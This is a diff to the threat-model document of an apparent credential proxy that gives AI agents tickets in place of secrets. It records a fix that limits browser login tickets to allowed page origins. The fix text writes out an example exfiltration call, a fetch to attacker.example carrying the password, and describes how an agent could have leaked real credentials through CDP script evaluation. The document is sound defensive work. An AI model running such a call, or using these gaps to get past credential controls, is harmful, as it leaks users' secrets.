@@ -136,6 +136,7 @@ the agent can also reach the internet directly.
 | Tickets expire | 900 s default (`COATCHECK_TICKET_TTL_SECONDS`); session-bound tickets 600 s default, 1800 s max (`packages/core/src/vault-handler.ts`) |
 | `curl -v` on the agent side shows only the ticket | Substitution happens after TLS termination, on coatcheck's upstream leg |
 | Session-bound (browser) tickets never resolve on HTTP(S) | `TokenStore.replaceAll` skips them (`packages/core/src/token-store.ts`) |
+| Browser login tickets fill only allowed origins | Substituted only in `Input.insertText`, only when the CDP session's committed main-frame origin matches the login secret's allowed hosts; unknown origin or navigation in progress → frame dropped with a CDP error; never substituted in `Runtime.*` (`packages/core/src/cdp/origin-tracker.ts`, `packages/core/src/cdp/substitution.ts`) |
 | Shared secrets are allowlisted | `/_secret/{name}` refuses names not listed under `shared` in the operator's policy file; with no policy file, it refuses every name (`packages/core/src/policy.ts`, `packages/core/src/vault-handler.ts`) |
 | Secret names are validated before any provider call | `^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$` (no `/`, no leading `.`), checked after URL-decoding on every route that takes a name; invalid names get `400` (`isValidSecretName`, `packages/core/src/secret-provider.ts`; `packages/core/src/vault-handler.ts`) |
 | Upstream TLS is verified | `tls.connect` with default `rejectUnauthorized` (`packages/core/src/mitm.ts`) |
@@ -168,8 +169,8 @@ attacks). What remains:
   `result=unbound`.
 - A secret's binding is only as narrow as its list. `*.example.com` trusts
   every subdomain, including ones a third party can host content on.
-- Browser (CDP) tickets record their login secret's hosts, but the CDP path
-  doesn't check them against the page yet (roadmap item 15).
+- Browser (CDP) tickets are checked against the page's main-frame origin,
+  not the frame that has focus; see "Browser injection" below.
 
 ### MEDIUM: tickets are reusable until TTL
 
@@ -239,9 +240,21 @@ inspected.
 
 ### Browser injection
 
-See `docs/design/cdp-injection.md` for gaps specific to the CDP path: no
-origin binding, `Runtime.evaluate` exfiltration, transform-blind redaction,
-uninspected binary frames.
+See `docs/design/cdp-injection.md` for gaps specific to the CDP path:
+script on an allowed origin can read the filled value, cross-origin iframe
+logins, transform-blind redaction, uninspected binary frames.
+
+Fixed by roadmap item 15: session-bound login tickets substituted on any
+page, and inside `Runtime.evaluate` / `Runtime.callFunctionOn`, so an agent
+could fill the real password into `https://attacker.example` or run
+`fetch('https://attacker.example/?p=' + 'cct_…')` with the real value.
+Tickets now substitute only in `Input.insertText`, only when the CDP
+session's committed main-frame origin (from `Page.frameNavigated`) is one of
+the login secret's allowed hosts, and never while that origin is unknown or a
+navigation is in progress; otherwise the frame is dropped with a CDP error
+(`cdp/origin-tracker.ts`, `cdp/substitution.ts`; attack tests in
+`cdp/substitution.test.ts`, `cdp/proxy.test.ts`, and the Playwright +
+Chromium `cdp/e2e.test.ts`).
 
 Fixed by roadmap item 14: `mint-tokens` accepted any `sessionId`, so a caller
 could mint credential tickets for a session that didn't exist or had already
